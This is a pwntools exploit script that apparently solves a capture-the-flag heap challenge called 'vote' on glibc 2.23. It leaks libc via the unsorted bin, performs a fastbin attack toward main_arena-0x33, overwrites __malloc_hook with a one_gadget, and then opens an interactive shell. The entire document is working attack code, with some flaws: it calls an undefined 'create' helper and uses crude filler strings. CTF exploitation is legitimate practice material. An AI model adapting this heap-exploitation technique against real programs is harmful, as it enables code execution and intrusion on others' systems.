from pwn import *
r = process('./vote')
#r = remote('node3.buuoj.cn', 25145)
libc = ELF('/libc-2.23.so')
elf = ELF('./vote')

def add(size, name):
	r.recvuntil('Action: ')
	r.sendline('0')
	r.recvuntil("Please enter the name's size: ")
	r.sendline(str(size))
	r.recvuntil('Please enter the name: ')
	r.sendline(name)
	
def show(index):
	r.recvuntil('Action: ')
	r.sendline('1')
	r.recvuntil('Please enter the index: ')
	r.sendline(str(index))
	

	
def free(index):
	r.recvuntil('Action: ')
	r.sendline('4')
	r.recvuntil('Please enter the index: ')
	r.sendline(str(index)) 
	
	

add(0x80,'fuck')
add(0x80,'fuck')

free(0)
show(0)
r.recvuntil('time:')
leak = int(r.recvuntil('\n',drop=True))
main_arena = leak - 0x58
libc_base = main_arena - 0x3c4b20
log.success(hex(libc_base))


payload = p64(0x60)+p64(main_arena-0x33) +p64(0xabcdef)
create(0x40,payload)
create(0x40,'fuck')
free(2)
free(3)

####---------malloc 0x70 0x30 padding in the unsortedbin chunk by free(1)-------
print "malloc 4 5 chunk"
add(0x50, chr(0x41))  #index 4
add(0x10, chr(0x42))  #index 5

####---------free(2) to get the big unsorted bin -------------------------------
free(2)

####---------malloc 0x70 index 6------------------------------------------------
payload_index6 = p64(0) + p64(0) + p64(0x30) + p64(0xd1)
add(0x50, payload_index6)  #index 6
###
add(0x70, 'A')
###in fact, the operation is necessary here.
print 'free index 2 chunk'
free(2)

print 'malloc 0x70 then fill content to fit the index 6 alignment'
payload_index8 = p64(0)*2 + p64(0)*2 + p64(0) + p64(0x71)
add(0x50, payload_index8)

print 'free 2 4 6'
free(2)
free(4)
free(6)

print 'malloc index 6 to fill the content to make the index2 fd = main_arena - 0x33'
payload_index6 = p64(0)*2 + p64(0) + p64(0x71) + p64(main_arena-0x33) + p64(0)
add(0x50,payload_index6)  #get chunk index 6
add(0x50, 'A'*4)   #fill chunk index 4
add(0x50, 'B'*4)   #get the index 2 chunk
print "will get the chunk malloc_hook"
print "one shell"

one = libc_base + 0xf1147
print 'one_gedget address: ' + hex(one)
payload = 'a'*0x3 + p64(one)
add(0x50, payload)   #fill the chunk malloc_hook
####----------malloc() to trigger to execve('/bin/sh', ....)------------------------
r.recvuntil('Action: ')
r.sendline(str(0))
r.recvuntil("Please enter the name's size: ")
r.sendline(str(0x50))
r.interactive()
